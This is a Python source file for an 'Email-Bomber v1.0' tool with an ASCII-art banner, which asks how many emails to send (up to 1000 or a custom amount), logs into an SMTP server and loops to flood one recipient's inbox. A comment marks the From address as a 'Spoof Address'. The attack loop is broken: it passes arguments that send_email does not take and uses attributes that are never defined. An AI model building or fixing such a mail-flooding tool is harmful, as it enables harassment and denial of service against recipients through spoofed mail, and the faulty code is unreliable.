'''imports'''
import smtplib
import sys
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os


def banner():
    print('------------------- +[+[+[+[ Email-Bomber v1.0 ]+]+]+]------------------- ')
    print('------------------- +[+[+[ made by FrozenByte ]+]+]+]------------------- ')
    print('''            
             . . .                    
              \|/                                                              
            `--+--'                   ▓█████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓       
              /|\                     ▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒             
             ' | '                    ▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░                
               |                      ▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░             
               |                      ░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒          
           ,--'#`--.                  ░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░         
           |#######|                   ░ ░  ░░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░        
        _.-'#######`-._                  ░   ░      ░     ░   ▒    ▒ ░  ░ ░             
     ,-'###############`-.               ░  ░       ░         ░  ░ ░      ░  ░         
   ,'#####################`,                                                                  
  /#########################\          ▄▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄   ▓█████  ██▀███      
 |###########################|        ▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ ▓█   ▀ ▓██ ▒ ██▒    
|#############################|       ▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██▒███   ▓██ ░▄█ ▒        
|#############################|       ▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄     
|#############################|       ░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓░▒████▒░██▓ ▒██▒    
|#############################|       ░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░     
 |###########################|        ▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░      
  \#########################/          ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░    ░     ░░   ░     
   `.#####################,'           ░          ░ ░         ░    ░         ░  ░   ░        
     `._###############_,'                 
        `--..#####..--'                                                    .-.--.'`*
              ___________________________________________________________,'by: CyberSamurai ''')
    
class EmailBomber:
    
    def __init__(self):
        try:
            print('------------------- +[+[+[ Initializing.... ]+]+]+]------------------- ')
            self.toAddr = str("")
            self.mode = int(input("Choose an option for number of emails to send:\n1:1\n2:500\n3:1000\n4:Custom amount\n"))

        except Exception as e:
            print(f"ERROR: {e}")
            sys.exit(1)

    def bomb(self):        
        if self.mode == 1:
            self.mode = 1
        elif self.mode == 2:
            self.mode = 500
        elif self.mode == 3:
            self.mode = 1000
        else:
            self.mode = int(input("How many emails do you want to send? <: "))
        
        print(f"Fantastic, you are going to send a total of {self.mode} emails")


    def send_email(self):
        smtp_server = "smtp.hostinger.com"  # Change for Yahoo, Outlook, etc.
        smtp_port = 587

        from_address = "hello@example.com"  # Appears in the recipient's inbox (Spoof Address)
        return_path = "hello@example.com"   # Where bounced emails go
        to_address = "receiver@outlook.com.com"
        subject = "Subject Email"
        body = "Email body message goes here"

        # Create the email
        msg = MIMEMultipart()
        msg["From"] = from_address
        msg["To"] = to_address
        msg["Subject"] = subject
        msg["Reply-To"] = from_address  # If recipient replies, it goes here
        msg["X-Priority"] = "1"  # Mark as high-priority (optional)

        msg.attach(MIMEText(body, "plain"))

        # Connect to SMTP server
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        pw =  os.getenv("passwd")
        server.login("hello@example.com", pw)

        # Send email with separate MAIL FROM (Return-Path) in SMTP envelope
        server.sendmail(return_path, to_address, msg.as_string())

        print("Email sent successfully!")
        server.quit()


    def attack(self):
        for each in range(1, self.mode + 1):
            try:
                self.send_email(self.fromAddr, self.toAddr, self.msg)
                print(f'BOMB: {each} sent')

            except Exception as e:
                print(f'ERROR: {e}')
        
        print(f'\nAttack completed. {self.toAddr} has been bombed with {self.mode} emails.')


if __name__ == '__main__':
    banner()
    bomber = EmailBomber()
    bomber.bomb()
    bomber.send_email()
    bomber.attack()